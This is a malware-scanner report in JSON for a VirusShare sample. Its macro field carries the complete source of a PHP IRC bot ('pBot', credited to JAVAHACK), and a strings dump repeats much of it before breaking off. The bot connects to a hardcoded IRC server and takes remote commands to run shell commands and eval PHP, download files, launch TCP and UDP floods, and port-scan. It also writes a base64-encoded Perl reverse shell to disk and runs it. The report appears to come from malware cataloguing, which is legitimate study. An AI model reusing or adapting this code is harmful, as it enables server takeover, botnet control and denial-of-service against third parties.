{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Shell": "May run an executable file or a system command",
            "chr": "May attempt to obfuscate specific str",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "kill": "May delete a file",
            "open": "May open a file",
            "popen": "May run an executable file or a system command on a Mac",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "<?\n\n\n\n/*\n\n*\n\n* -JAVAHACK. since 2011\n\n* REcoding by: JAVAHACK community\n\n*\n\n* COMMANDS:\n\n*\n\n* .user <password> //login to the bot\n\n* .logout //logout of the bot\n\n* .die //kill the bot\n\n* .restart //restart the bot\n\n* .mail <to> <from> <subject> <msg> //send an email\n\n* .dns <IP|HOST> //dns lookup\n\n* .download <URL> <filename> //download a file\n\n* .exec <cmd> // uses exec() //execute a command\n\n* .sexec <cmd> // uses shell_exec() //execute a command\n\n* .cmd <cmd> // uses popen() //execute a command\n\n* .info //get system information\n\n* .php <php code> // uses eval() //execute php code\n\n* .tcpflood <target> <packets> <packetsize> <port> <delay> //tcpflood attack\n\n* .udpflood <target> <packets> <packetsize> <delay> //udpflood attack\n\n* .raw <cmd> //raw IRC command\n\n* .rndnick //change nickname\n\n* .pscan <host> <port> //port scan\n\n* .safe // test safe_mode (dvl)\n\n* .inbox <to> // test inbox (dvl)\n\n* .conback <ip> <port> // conect back (dvl)\n\n* .uname // return shell's uname using a php function (dvl)\n\n*\n\n*/\n\n\n\nset_time_limit(0);\n\nerror_reporting(0);\n\necho \"ok!\";\n\n\n\nclass pBot\n\n{\n\nvar $config = array(\"server\"=>\"72.32.184.29\",\n\n\"port\"=>\"6667\",\n\n\"pass\"=>\"\",\n\n\"prefix\"=>\"Suara\",\n\n\"maxrand\"=>\"5\",\n\n\"chan\"=>\"#r4ni\",\n\n\"chan2\"=>\"#r4ni\",\n\n\"key\"=>\"bot\",\n\n\"modes\"=>\"+ps\",\n\n\"password\"=>\"eeq\",\n\n\"trigger\"=>\".\",\n\n\"hostauth\"=>\"netadmin.pekanbaru.crimecyber.tk\" // * for any hostname (remember: /setvhost netadmin.pekanbaru.crimecyber.tk)\n\n);\n\nvar $users = array();\n\nfunction start()\n\n{\n\nif(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30)))\n\n$this->start();\n\n$ident = $this->config['prefix'];\n\n$alph = range(\"0\",\"9\");\n\nfor($i=0;$i<$this->config['maxrand'];$i++)\n\n$ident .= $alph[rand(0,9)];\n\nif(strlen($this->config['pass'])>0)\n\n$this->send(\"PASS \".$this->config['pass']);\n\n$this->send(\"USER \".$ident.\" 127.0.0.1 localhost :\".php_uname().\"\");\n\n$this->set_nick();\n\n$this->main();\n\n}\n\nfunction main()\n\n{\n\nwhile(!feof($this->conn))\n\n{\n\n$this->buf = trim(fgets($this->conn,512));\n\n$cmd = explode(\" \",$this->buf);\n\nif(substr($this->buf,0,6)==\"PING :\")\n\n{\n\n$this->send(\"PONG :\".substr($this->buf,6));\n\n}\n\nif(isset($cmd[1]) && $cmd[1] ==\"001\")\n\n{\n\n$this->send(\"MODE \".$this->nick.\" \".$this->config['modes']);\n\n$this->join($this->config['chan'],$this->config['key']);\n\nif (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }\n\nelse { $safemode = \"off\"; }\n\n$uname = php_uname();\n\n$this->privmsg($this->config['chan2'],\"[\\2uname!\\2]: $uname (safe: $safemode)\");\n\n\n\n}\n\nif(isset($cmd[1]) && $cmd[1]==\"433\")\n\n{\n\n$this->set_nick();\n\n}\n\nif($this->buf != $old_buf)\n\n{\n\n$mcmd = array();\n\n$msg = substr(strstr($this->buf,\" :\"),2);\n\n$msgcmd = explode(\" \",$msg);\n\n$nick = explode(\"!\",$cmd[0]);\n\n$vhost = explode(\"@\",$nick[1]);\n\n$vhost = $vhost[1];\n\n$nick = substr($nick[0],1);\n\n$host = $cmd[0];\n\nif($msgcmd[0]==$this->nick)\n\n{\n\nfor($i=0;$i<count($msgcmd);$i++)\n\n$mcmd[$i] = $msgcmd[$i+1];\n\n}\n\nelse\n\n{\n\nfor($i=0;$i<count($msgcmd);$i++)\n\n$mcmd[$i] = $msgcmd[$i];\n\n}\n\nif(count($cmd)>2)\n\n{\n\nswitch($cmd[1])\n\n{\n\ncase \"QUIT\":\n\nif($this->is_logged_in($host))\n\n{\n\n$this->log_out($host);\n\n}\n\nbreak;\n\ncase \"PART\":\n\nif($this->is_logged_in($host))\n\n{\n\n$this->log_out($host);\n\n}\n\nbreak;\n\ncase \"PRIVMSG\":\n\nif(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == \"*\"))\n\n{\n\nif(substr($mcmd[0],0,1)==\".\")\n\n{\n\nswitch(substr($mcmd[0],1))\n\n{\n\ncase \"user\":\n\nif($mcmd[1]==$this->config['password'])\n\n{\n\n$this->privmsg($this->config['chan'],\"[\\2Auth\\2]: OK $nick SiaP KoMaNDan... My OwnER !!!!!!!!!!!!!!!!!!!!\");\n\n$this->log_in($host);\n\n}\n\nelse\n\n{\n\n$this->privmsg($this->config['chan'],\"[\\2Auth\\2]: FUCK YOU.....!!!! $nick !!!!\");\n\n}\n\nbreak;\n\n}\n\n}\n\n}\n\nelseif($this->is_logged_in($host))\n\n{\n\nif(substr($mcmd[0],0,1)==\".\")\n\n{\n\nswitch(substr($mcmd[0],1))\n\n{\n\ncase \"restart\":\n\n$this->send(\"QUIT :restart commando from $nick\");\n\nfclose($this->conn);\n\n$this->start();\n\nbreak;\n\ncase \"mail\": //mail to from subject message\n\nif(count($mcmd)>4)\n\n{\n\n$header = \"From: <\".$mcmd[2].\">\";\n\nif(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header))\n\n{\n\n$this->privmsg($this->config['chan'],\"[\\2mail\\2]: Impossivel mandar e-mail.\");\n\n}\n\nelse\n\n{\n\n$this->privmsg($this->config['chan'],\"[\\2mail\\2]: Mensagem enviada para \\2\".$mcmd[1].\"\\2\");\n\n}\n\n}\n\nbreak;\n\ncase \"safe\":\n\nif (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\")\n\n{\n\n$safemode = \"on\";\n\n}\n\nelse {\n\n$safemode = \"off\";\n\n}\n\n$this->privmsg($this->config['chan'],\"[\\2safe mode\\2]: \".$safemode.\"\");\n\nbreak;\n\ncase \"inbox\": //teste inbox\n\nif(isset($mcmd[1]))\n\n{\n\n$token = md5(uniqid(rand(), true));\n\n$header = \"From: <inbox\".$blackxp45.\"@yahoo.com>\";\n\n$a = php_uname();\n\n$b = getenv(\"SERVER_SOFTWARE\");\n\n$c = gethostbyname($_SERVER[\"HTTP_HOST\"]);\n\nif(!mail($mcmd[1],\"InBox Test\",\"#medan@javahack. since 2003\\n\\nip: $c \\nsoftware: $b \\nsystem: $a \\nvuln: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\\n\\ngreetz: wicked\\nby: dvl <blackxp45@yahoo.com>\",$header))\n\n{\n\n$this->privmsg($this->config['chan'],\"[\\2inbox\\2]: Unable to send\");\n\n}\n\nelse\n\n{\n\n$this->privmsg($this->config['chan'],\"[\\2inbox\\2]: Message sent to \\2\".$mcmd[1].\"\\2\");\n\n}\n\n}\n\nbreak;\n\ncase \"conback\":\n\nif(count($mcmd)>2)\n\n{\n\n$this->conback($mcmd[1],$mcmd[2]);\n\n}\n\nbreak;\n\ncase \"dns\":\n\nif(isset($mcmd[1]))\n\n{\n\n$ip = explode(\".\",$mcmd[1]);\n\nif(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3]))\n\n{\n\n$this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyaddr($mcmd[1]));\n\n}\n\nelse\n\n{\n\n$this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyname($mcmd[1]));\n\n}\n\n}\n\nbreak;\n\ncase \"info\":\n\ncase \"vunl\":\n\nif (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }\n\nelse { $safemode = \"off\"; }\n\n$uname = php_uname();\n\n$this->privmsg($this->config['chan'],\"[\\2info\\2]: $uname (safe: $safemode)\");\n\n$this->privmsg($this->config['chan'],\"[\\2vuln\\2]: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\");\n\nbreak;\n\ncase \"bot\":\n\n$this->privmsg($this->config['chan'],\"[\\2bot\\2]: phpbot 2.0 recording by JaVaHaCk.\");\n\nbreak;\n\ncase \"uname\":\n\nif (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }\n\nelse { $safemode = \"off\"; }\n\n$uname = php_uname();\n\n$this->privmsg($this->config['chan'],\"[\\2info\\2]: $uname (safe: $safemode)\");\n\nbreak;\n\ncase \"rndnick\":\n\n$this->set_nick();\n\nbreak;\n\ncase \"raw\":\n\n$this->send(strstr($msg,$mcmd[1]));\n\nbreak;\n\ncase \"eval\":\n\n$eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));\n\nbreak;\n\ncase \"sexec\":\n\n$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);\n\n$exec = shell_exec($command);\n\n$ret = explode(\"\\n\",$exec);\n\nfor($i=0;$i<count($ret);$i++)\n\nif($ret[$i]!=NULL)\n\n$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));\n\nbreak;\n\n\n\ncase \"exec\":\n\n$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);\n\n$exec = exec($command);\n\n$ret = explode(\"\\n\",$exec);\n\nfor($i=0;$i<count($ret);$i++)\n\nif($ret[$i]!=NULL)\n\n$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));\n\nbreak;\n\n\n\ncase \"passthru\":\n\n$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);\n\n$exec = passthru($command);\n\n$ret = explode(\"\\n\",$exec);\n\nfor($i=0;$i<count($ret);$i++)\n\nif($ret[$i]!=NULL)\n\n$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));\n\nbreak;\n\n\n\ncase \"popen\":\n\nif(isset($mcmd[1]))\n\n{\n\n$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);\n\n$this->privmsg($this->config['chan'],\"[\\2popen\\2]: $command\");\n\n$pipe = popen($command,\"r\");\n\nwhile(!feof($pipe))\n\n{\n\n$pbuf = trim(fgets($pipe,512));\n\nif($pbuf != NULL)\n\n$this->privmsg($this->config['chan'],\" : $pbuf\");\n\n}\n\npclose($pipe);\n\n}\n\n\n\ncase \"system\":\n\n$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);\n\n$exec = system($command);\n\n$ret = explode(\"\\n\",$exec);\n\nfor($i=0;$i<count($ret);$i++)\n\nif($ret[$i]!=NULL)\n\n$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));\n\nbreak;\n\n\n\n\n\ncase \"pscan\": // .pscan 127.0.0.1 6667\n\nif(count($mcmd) > 2)\n\n{\n\nif(fsockopen($mcmd[1],$mcmd[2],$e,$s,15))\n\n$this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2open\\2\");\n\nelse\n\n$this->privmsg($this->config['chan'],\"[\\2pscan\\2]: \".$mcmd[1].\":\".$mcmd[2].\" is \\2closed\\2\");\n\n}\n\nbreak;\n\n\n\n\n\ncase \"download\":\n\nif(count($mcmd) > 2)\n\n{\n\nif(!$fp = fopen($mcmd[2],\"w\"))\n\n{\n\n$this->privmsg($this->config['chan'],\"[\\2download\\2]: Nao foi possivel fazer o download. Permissao negada.\");\n\n}\n\nelse\n\n{\n\nif(!$get = file($mcmd[1]))\n\n{\n\n$this->privmsg($this->config['chan'],\"[\\2download\\2]: Nao foi possivel fazer o download de \\2\".$mcmd[1].\"\\2\");\n\n}\n\nelse\n\n{\n\nfor($i=0;$i<=count($get);$i++)\n\n{\n\nfwrite($fp,$get[$i]);\n\n}\n\n$this->privmsg($this->config['chan'],\"[\\2download\\2]: Arquivo \\2\".$mcmd[1].\"\\2 baixado para \\2\".$mcmd[2].\"\\2\");\n\n}\n\nfclose($fp);\n\n}\n\n}\n\nelse { $this->privmsg($this->config['chan'],\"[\\2download\\2]: use .download http://your.host/file /tmp/file\"); }\n\nbreak;\n\ncase \"die\":\n\n$this->send(\"QUIT : $nick \u001f\u0002\u00033,1-\u000312=\u000304[\u000309[\u000313 JaVaHaCK \u00039]\u000304]\u000312=\u000303-\");\n\nfclose($this->conn);\n\nexit;\n\ncase \"logout\":\n\n$this->log_out($host);\n\n$this->privmsg($this->config['chan'],\"[\\2auth\\2]: $nick Ndang Cewok Lek Wes Mari!!!!\");\n\nbreak;\n\ncase \"udpflood\":\n\nif(count($mcmd)>3)\n\n{\n\n$this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]);\n\n}\n\nbreak;\n\ncase \"tcpflood\":\n\nif(count($mcmd)>5)\n\n{\n\n$this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]);\n\n}\n\nbreak;\n\n}\n\n}\n\n}\n\nbreak;\n\n}\n\n}\n\n}\n\n$old_buf = $this->buf;\n\n}\n\n$this->start();\n\n}\n\nfunction send($msg)\n\n{\n\nfwrite($this->conn,\"$msg\\r\\n\");\n\n\n\n}\n\nfunction join($chan,$key=NULL)\n\n{\n\n$this->send(\"JOIN $chan $key\");\n\n}\n\nfunction privmsg($to,$msg)\n\n{\n\n$this->send(\"PRIVMSG $to :$msg\");\n\n}\n\nfunction notice($to,$msg)\n\n{\n\n$this->send(\"NOTICE $to :$msg\");\n\n}\n\nfunction is_logged_in($host)\n\n{\n\nif(isset($this->users[$host]))\n\nreturn 1;\n\nelse\n\nreturn 0;\n\n}\n\nfunction log_in($host)\n\n{\n\n$this->users[$host] = true;\n\n}\n\nfunction log_out($host)\n\n{\n\nunset($this->users[$host]);\n\n}\n\nfunction set_nick()\n\n{\n\nif(isset($_SERVER['SERVER_SOFTWARE']))\n\n{\n\nif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"apache\"))\n\n$this->nick = \"[A]\";\n\nelseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"iis\"))\n\n$this->nick = \"[B]\";\n\nelseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),\"xitami\"))\n\n$this->nick = \"[C]\";\n\nelse\n\n$this->nick = \"[D]\";\n\n}\n\nelse\n\n{\n\n$this->nick = \"[E]\";\n\n}\n\n$this->nick .= $this->config['prefix'];\n\nfor($i=0;$i<$this->config['maxrand'];$i++)\n\n$this->nick .= mt_rand(0,9);\n\n$this->send(\"NICK \".$this->nick);\n\n}\n\nfunction udpflood($host,$packetsize,$time) {\n\n$this->privmsg($this->config['chan'],\"[\\2UdpFlood Started!\\2]\");\n\n$packet = \"\";\n\nfor($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }\n\n$timei = time();\n\n$i = 0;\n\nwhile(time()-$timei < $time) {\n\n$fp=fsockopen(\"udp://\".$host,mt_rand(0,6000),$e,$s,5);\n\nfwrite($fp,$packet);\n\nfclose($fp);\n\n$i++;\n\n}\n\n$env = $i * $packetsize;\n\n$env = $env / 1048576;\n\n$vel = $env / $time;\n\n$vel = round($vel);\n\n$env = round($env);\n\n$this->privmsg($this->config['chan'],\"[\\2UdpFlood Finished!\\2]: $env MB enviados / Media: $vel MB/s \");\n\n}\n\nfunction tcpflood($host,$packets,$packetsize,$port,$delay)\n\n{\n\n$this->privmsg($this->config['chan'],\"[\\2TcpFlood Started!\\2]\");\n\n$packet = \"\";\n\nfor($i=0;$i<$packetsize;$i++)\n\n$packet .= chr(mt_rand(1,256));\n\nfor($i=0;$i<$packets;$i++)\n\n{\n\nif(!$fp=fsockopen(\"tcp://\".$host,$port,$e,$s,5))\n\n{\n\n$this->privmsg($this->config['chan'],\"[\\2TcpFlood\\2]: Error: <$e>\");\n\nreturn 0;\n\n}\n\nelse\n\n{\n\nfwrite($fp,$packet);\n\nfclose($fp);\n\n}\n\nsleep($delay);\n\n}\n\n$this->privmsg($this->config['chan'],\"[\\2TcpFlood Finished!\\2]: Config - $packets pacotes para $host:$port.\");\n\n}\n\nfunction conback($ip,$port)\n\n{\n\n$this->privmsg($this->config['chan'],\"[\\2conback\\2]: tentando conectando a $ip:$port\");\n\n$dc_source = \"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KcHJpbnQgIkRhdGEgQ2hhMHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQppZiAoISRBUkdWWzBdKSB7DQogIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogIGV4aXQoMSk7DQp9DQpwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KJGhvc3QgPSAkQVJHVlswXTsNCiRwb3J0ID0gODA7DQppZiAoJEFSR1ZbMV0pIHsNCiAgJHBvcnQgPSAkQVJHVlsxXTsNCn0NCnByaW50ICJbKl0gQ29ubmVjdGluZy4uLlxuIjsNCiRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3AnKSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0Kc29ja2V0KFNFUlZFUiwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCm15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KaWYgKCFjb25uZWN0KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogIGRpZSgiVW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KfQ0KcHJpbnQgIlsqXSBTcGF3bmluZyBTaGVsbFxuIjsNCmlmICghZm9yayggKSkgew0KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOw0KICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERFUlIsIj4mU0VSVkVSIik7DQogIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow0KICBleGl0KDApOw0KfQ0KcHJpbnQgIlsqXSBEYXRhY2hlZFxuXG4iOw==\";\n\nif (is_writable(\"/tmp\"))\n\n{\n\nif (file_exists(\"/tmp/dc.pl\")) { unlink(\"/tmp/dc.pl\"); }\n\n$fp=fopen(\"/tmp/dc.pl\",\"w\");\n\nfwrite($fp,base64_decode($dc_source));\n\npassthru(\"perl /tmp/dc.pl $ip $port &\");\n\nunlink(\"/tmp/dc.pl\");\n\n}\n\nelse\n\n{\n\nif (is_writable(\"/var/tmp\"))\n\n{\n\nif (file_exists(\"/var/tmp/dc.pl\")) { unlink(\"/var/tmp/dc.pl\"); }\n\n$fp=fopen(\"/var/tmp/dc.pl\",\"w\");\n\nfwrite($fp,base64_decode($dc_source));\n\npassthru(\"perl /var/tmp/dc.pl $ip $port &\");\n\nunlink(\"/var/tmp/dc.pl\");\n\n}\n\nif (is_writable(\".\"))\n\n{\n\nif (file_exists(\"dc.pl\")) { unlink(\"dc.pl\"); }\n\n$fp=fopen(\"dc.pl\",\"w\");\n\nfwrite($fp,base64_decode($dc_source));\n\npassthru(\"perl dc.pl $ip $port &\");\n\nunlink(\"dc.pl\");\n\n}\n\n}\n\n}\n\n}\n\n\n\n$bot = new pBot;\n\n$bot->start();\n\n\n\n?> "
    },
    "filename": "VirusShare_0c8683ffab340b4b93ef98af5c8b79ac",
    "filesize": 14537,
    "filetype": "data",
    "hashes": {
        "md5": "0c8683ffab340b4b93ef98af5c8b79ac",
        "sha1": "ae7a7e8c4a30a88cfeb12282e3da4d3706737132",
        "sha256": "9ba37f749af62380524b536d912c8afecd5d4986df849947fe71c51323dcc8b5"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "* -JAVAHACK. since 2011",
            "* REcoding by: JAVAHACK community",
            "* COMMANDS:",
            "* .user <password> //login to the bot",
            "* .logout //logout of the bot",
            "* .die //kill the bot",
            "* .restart //restart the bot",
            "* .mail <to> <from> <subject> <msg> //send an email",
            "* .dns <IP|HOST> //dns lookup",
            "* .download <URL> <filename> //download a file",
            "* .exec <cmd> // uses exec() //execute a command",
            "* .sexec <cmd> // uses shell_exec() //execute a command",
            "* .cmd <cmd> // uses popen() //execute a command",
            "* .info //get system information",
            "* .php <php code> // uses eval() //execute php code",
            "* .tcpflood <target> <packets> <packetsize> <port> <delay> //tcpflood attack",
            "* .udpflood <target> <packets> <packetsize> <delay> //udpflood attack",
            "* .raw <cmd> //raw IRC command",
            "* .rndnick //change nickname",
            "* .pscan <host> <port> //port scan",
            "* .safe // test safe_mode (dvl)",
            "* .inbox <to> // test inbox (dvl)",
            "* .conback <ip> <port> // conect back (dvl)",
            "* .uname // return shell's uname using a php function (dvl)",
            "set_time_limit(0);",
            "error_reporting(0);",
            "echo \"ok!\";",
            "class pBot",
            "var $config = array(\"server\"=>\"72.32.184.29\",",
            "\"port\"=>\"6667\",",
            "\"pass\"=>\"\",",
            "\"prefix\"=>\"Suara\",",
            "\"maxrand\"=>\"5\",",
            "\"chan\"=>\"#r4ni\",",
            "\"chan2\"=>\"#r4ni\",",
            "\"key\"=>\"bot\",",
            "\"modes\"=>\"+ps\",",
            "\"password\"=>\"eeq\",",
            "\"trigger\"=>\".\",",
            "\"hostauth\"=>\"netadmin.pekanbaru.crimecyber.tk\" // * for any hostname (remember: /setvhost netadmin.pekanbaru.crimecyber.tk)",
            "var $users = array();",
            "function start()",
            "if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30)))",
            "$this->start();",
            "$ident = $this->config['prefix'];",
            "$alph = range(\"0\",\"9\");",
            "for($i=0;$i<$this->config['maxrand'];$i++)",
            "$ident .= $alph[rand(0,9)];",
            "if(strlen($this->config['pass'])>0)",
            "$this->send(\"PASS \".$this->config['pass']);",
            "$this->send(\"USER \".$ident.\" 127.0.0.1 localhost :\".php_uname().\"\");",
            "$this->set_nick();",
            "$this->main();",
            "function main()",
            "while(!feof($this->conn))",
            "$this->buf = trim(fgets($this->conn,512));",
            "$cmd = explode(\" \",$this->buf);",
            "if(substr($this->buf,0,6)==\"PING :\")",
            "$this->send(\"PONG :\".substr($this->buf,6));",
            "if(isset($cmd[1]) && $cmd[1] ==\"001\")",
            "$this->send(\"MODE \".$this->nick.\" \".$this->config['modes']);",
            "$this->join($this->config['chan'],$this->config['key']);",
            "if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }",
            "else { $safemode = \"off\"; }",
            "$uname = php_uname();",
            "$this->privmsg($this->config['chan2'],\"[\\2uname!\\2]: $uname (safe: $safemode)\");",
            "if(isset($cmd[1]) && $cmd[1]==\"433\")",
            "$this->set_nick();",
            "if($this->buf != $old_buf)",
            "$mcmd = array();",
            "$msg = substr(strstr($this->buf,\" :\"),2);",
            "$msgcmd = explode(\" \",$msg);",
            "$nick = explode(\"!\",$cmd[0]);",
            "$vhost = explode(\"@\",$nick[1]);",
            "$vhost = $vhost[1];",
            "$nick = substr($nick[0],1);",
            "$host = $cmd[0];",
            "if($msgcmd[0]==$this->nick)",
            "for($i=0;$i<count($msgcmd);$i++)",
            "$mcmd[$i] = $msgcmd[$i+1];",
            "else",
            "for($i=0;$i<count($msgcmd);$i++)",
            "$mcmd[$i] = $msgcmd[$i];",
            "if(count($cmd)>2)",
            "switch($cmd[1])",
            "case \"QUIT\":",
            "if($this->is_logged_in($host))",
            "$this->log_out($host);",
            "break;",
            "case \"PART\":",
            "if($this->is_logged_in($host))",
            "$this->log_out($host);",
            "break;",
            "case \"PRIVMSG\":",
            "if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == \"*\"))",
            "if(substr($mcmd[0],0,1)==\".\")",
            "switch(substr($mcmd[0],1))",
            "case \"user\":",
            "if($mcmd[1]==$this->config['password'])",
            "$this->privmsg($this->config['chan'],\"[\\2Auth\\2]: OK $nick SiaP KoMaNDan... My OwnER !!!!!!!!!!!!!!!!!!!!\");",
            "$this->log_in($host);",
            "else",
            "$this->privmsg($this->config['chan'],\"[\\2Auth\\2]: FUCK YOU.....!!!! $nick !!!!\");",
            "break;",
            "elseif($this->is_logged_in($host))",
            "if(substr($mcmd[0],0,1)==\".\")",
            "switch(substr($mcmd[0],1))",
            "case \"restart\":",
            "$this->send(\"QUIT :restart commando from $nick\");",
            "fclose($this->conn);",
            "$this->start();",
            "break;",
            "case \"mail\": //mail to from subject message",
            "if(count($mcmd)>4)",
            "$header = \"From: <\".$mcmd[2].\">\";",
            "if(!mail($mcmd[1],$mcmd[3],strstr($msg,$mcmd[4]),$header))",
            "$this->privmsg($this->config['chan'],\"[\\2mail\\2]: Impossivel mandar e-mail.\");",
            "else",
            "$this->privmsg($this->config['chan'],\"[\\2mail\\2]: Mensagem enviada para \\2\".$mcmd[1].\"\\2\");",
            "break;",
            "case \"safe\":",
            "if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\")",
            "$safemode = \"on\";",
            "else {",
            "$safemode = \"off\";",
            "$this->privmsg($this->config['chan'],\"[\\2safe mode\\2]: \".$safemode.\"\");",
            "break;",
            "case \"inbox\": //teste inbox",
            "if(isset($mcmd[1]))",
            "$token = md5(uniqid(rand(), true));",
            "$header = \"From: <inbox\".$blackxp45.\"@yahoo.com>\";",
            "$a = php_uname();",
            "$b = getenv(\"SERVER_SOFTWARE\");",
            "$c = gethostbyname($_SERVER[\"HTTP_HOST\"]);",
            "if(!mail($mcmd[1],\"InBox Test\",\"#medan@javahack. since 2003\\n\\nip: $c \\nsoftware: $b \\nsystem: $a \\nvuln: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\\n\\ngreetz: wicked\\nby: dvl <blackxp45@yahoo.com>\",$header))",
            "$this->privmsg($this->config['chan'],\"[\\2inbox\\2]: Unable to send\");",
            "else",
            "$this->privmsg($this->config['chan'],\"[\\2inbox\\2]: Message sent to \\2\".$mcmd[1].\"\\2\");",
            "break;",
            "case \"conback\":",
            "if(count($mcmd)>2)",
            "$this->conback($mcmd[1],$mcmd[2]);",
            "break;",
            "case \"dns\":",
            "if(isset($mcmd[1]))",
            "$ip = explode(\".\",$mcmd[1]);",
            "if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3]))",
            "$this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyaddr($mcmd[1]));",
            "else",
            "$this->privmsg($this->config['chan'],\"[\\2dns\\2]: \".$mcmd[1].\" => \".gethostbyname($mcmd[1]));",
            "break;",
            "case \"info\":",
            "case \"vunl\":",
            "if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }",
            "else { $safemode = \"off\"; }",
            "$uname = php_uname();",
            "$this->privmsg($this->config['chan'],\"[\\2info\\2]: $uname (safe: $safemode)\");",
            "$this->privmsg($this->config['chan'],\"[\\2vuln\\2]: http://\".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\");",
            "break;",
            "case \"bot\":",
            "$this->privmsg($this->config['chan'],\"[\\2bot\\2]: phpbot 2.0 recording by JaVaHaCk.\");",
            "break;",
            "case \"uname\":",
            "if (@ini_get(\"safe_mode\") or strtolower(@ini_get(\"safe_mode\")) == \"on\") { $safemode = \"on\"; }",
            "else { $safemode = \"off\"; }",
            "$uname = php_uname();",
            "$this->privmsg($this->config['chan'],\"[\\2info\\2]: $uname (safe: $safemode)\");",
            "break;",
            "case \"rndnick\":",
            "$this->set_nick();",
            "break;",
            "case \"raw\":",
            "$this->send(strstr($msg,$mcmd[1]));",
            "break;",
            "case \"eval\":",
            "$eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));",
            "break;",
            "case \"sexec\":",
            "$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);",
            "$exec = shell_exec($command);",
            "$ret = explode(\"\\n\",$exec);",
            "for($i=0;$i<count($ret);$i++)",
            "if($ret[$i]!=NULL)",
            "$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));",
            "break;",
            "case \"exec\":",
            "$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);",
            "$exec = exec($command);",
            "$ret = explode(\"\\n\",$exec);",
            "for($i=0;$i<count($ret);$i++)",
            "if($ret[$i]!=NULL)",
            "$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));",
            "break;",
            "case \"passthru\":",
            "$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);",
            "$exec = passthru($command);",
            "$ret = explode(\"\\n\",$exec);",
            "for($i=0;$i<count($ret);$i++)",
            "if($ret[$i]!=NULL)",
            "$this->privmsg($this->config['chan'],\" : \".trim($ret[$i]));",
            "break;",
            "case \"popen\":",
            "if(isset($mcmd[1]))",
            "$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);",
            "$this->privmsg($this->config['chan'],\"[\\2popen\\2]: $command\");",
            "$pipe = popen($command,\"r\");",
            "while(!feof($pipe))",
